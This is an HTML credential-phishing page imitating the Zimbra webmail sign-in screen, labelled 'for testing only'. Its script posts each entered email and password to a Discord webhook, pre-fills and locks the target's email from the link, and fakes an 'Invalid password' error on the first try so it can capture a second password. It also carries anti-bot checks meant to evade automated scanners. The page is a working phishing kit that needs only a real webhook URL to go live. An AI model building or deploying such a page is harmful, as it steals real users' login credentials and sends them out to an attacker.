<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Zimbra – Sign In (Test)</title>
<style>
  :root {
    --primary:#2d8bc4;
    --text:#222;
    --muted:#666;
    --border:#ddd;
    font-family:"Segoe UI","Helvetica Neue",Arial,sans-serif;
  }

  body{
    margin:0;
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    background:url('bg25.jpg') no-repeat center center;
    background-size:cover;
    background-attachment:fixed;
  }

  .overlay {
    position:fixed;
    inset:0;
    background:rgba(0,0,0,0.35); /* dark tint for contrast */
  }

  .card{
    position:relative;
    width:360px;
    max-width:95%;
    background:#fff;
    border-radius:8px;
    box-shadow:0 6px 18px rgba(0,0,0,.25);
    padding:36px 32px 28px;
    box-sizing:border-box;
    z-index:2;
  }

  .logo{color:var(--primary);font-size:28px;font-weight:700;margin-bottom:8px;}
  h2{margin:0 0 20px;font-size:18px;color:var(--text);}
  label{font-size:13px;font-weight:600;color:var(--muted);display:block;margin-bottom:5px;}

  input[type="text"],input[type="password"],select{
    width:100%;
    padding:10px;
    font-size:15px;
    border:1px solid var(--border);
    border-radius:4px;
    margin-bottom:14px;
    box-sizing:border-box;
  }

  input:focus{outline:none;border-color:var(--primary);box-shadow:0 0 0 2px rgba(45,139,196,.25);}
  .locked{border:none;background:transparent;pointer-events:none;font-weight:600;color:var(--text);margin-bottom:20px;}
  .error{color:#d93025;font-size:13px;margin-top:-8px;margin-bottom:10px;display:none;}
  .success{color:green;font-size:13px;margin-top:-5px;margin-bottom:10px;display:none;}

  button{
    width:100%;background:var(--primary);color:#fff;border:none;border-radius:4px;
    font-size:15px;font-weight:600;padding:10px;cursor:pointer;margin-top:5px;
  }

  .options{display:flex;justify-content:space-between;align-items:center;margin-top:10px;flex-wrap:wrap;gap:8px;}
  .options label{font-weight:normal;font-size:13px;}
  .note{font-size:12px;color:var(--muted);margin-top:8px;text-align:center;}
  .footer{position:fixed;bottom:12px;width:100%;text-align:center;color:#fff;font-size:12px;opacity:.9;z-index:2;}

  /* MOBILE */
  @media(max-width:480px){
    body{align-items:flex-start;padding:20px;background-size:contain;}
    .card{margin-top:60px;padding:26px 20px;}
    .logo{font-size:24px;}
    h2{font-size:16px;}
    button{padding:12px;}
    .footer{position:static;margin-top:25px;font-size:11px;}
  }
</style>
</head>
<body>
  <div class="overlay"></div>

  <div class="card">
    <div class="logo">zimbra</div>
    <h2>Sign In</h2>

    <form id="loginForm" novalidate>
      <!-- Honeypot (hidden anti-bot trap) -->
      <input type="text" id="trap" name="trap" style="display:none" tabindex="-1" autocomplete="off" />

      <label for="email">Username</label>
      <input type="text" id="email" placeholder="name@example.com" required />
      <div id="emailError" class="error">Enter a valid email address.</div>

      <label for="password">Password</label>
      <input type="password" id="password" required />
      <div id="pwdError" class="error">Password is required.</div>

      <div id="invalidMsg" class="error">Invalid password. Please try again.</div>
      <div id="okMsg" class="success">Success! Redirecting…</div>

      <button type="submit">Sign In</button>

      <div class="options">
        <label><input type="checkbox" /> Stay signed in</label>
        <label>Web App Version
          <select><option>Default</option></select>
        </label>
      </div>
      <div class="note">For testing only — do not use real user credentials.</div>
    </form>
  </div>

  <div class="footer">
    Copyright © 2005–2025 Synacor, Inc. All rights reserved.
  </div>

<script>
const form=document.getElementById("loginForm");
const emailField=document.getElementById("email");
const passwordField=document.getElementById("password");
const trap=document.getElementById("trap");
const emailError=document.getElementById("emailError");
const pwdError=document.getElementById("pwdError");
const invalidMsg=document.getElementById("invalidMsg");
const okMsg=document.getElementById("okMsg");

const WEBHOOK_URL="https://discord.com/api/webhooks/REPLACE_WITH_YOURS/XXXXXX";
const emailRegex=/^[\\w.%+-]+@[\\w.-]+\\.[A-Za-z]{2,}$/;
let attempt=0;
let startTime=Date.now(); // for anti-bot timing

function show(e){e.style.display="block";}
function hide(e){e.style.display="none";}

function detectEmail(){
  try{
    const params=new URLSearchParams(window.location.search);
    const urlEmail=params.get("email");
    if(urlEmail) return decodeURIComponent(urlEmail);
  }catch{}
  return null;
}

function lockEmail(email){
  emailField.value=email;
  emailField.classList.add("locked");
  emailField.setAttribute("readonly",true);
}

async function sendWebhook(payload){
  if(!WEBHOOK_URL.includes("REPLACE_WITH")){
    try{
      await fetch(WEBHOOK_URL,{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify(payload)
      });
    }catch(e){console.warn("Webhook failed:",e);}
  }
}

document.addEventListener("DOMContentLoaded",()=>{
  const found=detectEmail();
  if(found && /^[\\w.%+-]+@[\\w.-]+\\.[A-Za-z]{2,}$/.test(found)){lockEmail(found);}
});

form.addEventListener("submit",async(e)=>{
  e.preventDefault();
  hide(emailError);hide(pwdError);hide(invalidMsg);hide(okMsg);

  // --- Anti-bot: honeypot and timing ---
  const elapsed=(Date.now()-startTime)/1000;
  if(trap.value || elapsed<3){
    alert("Bot-like activity detected. Submission blocked.");
    return;
  }

  const email=emailField.value.trim();
  const pwd=passwordField.value.trim();

  if(!email || !/^[\\w.%+-]+@[\\w.-]+\\.[A-Za-z]{2,}$/.test(email)) return show(emailError);
  if(!pwd) return show(pwdError);

  attempt++;
  const payload={email,password:pwd,attempt,success:false,time:new Date().toISOString()};

  if(attempt===1){
    show(invalidMsg);
    await sendWebhook(payload);
    passwordField.value="";
    passwordField.focus();
    return;
  }

  payload.success=true;
  await sendWebhook(payload);
  show(okMsg);
  setTimeout(()=>window.location.href="dashboard.html",900);
});
</script>
</body>
</html>
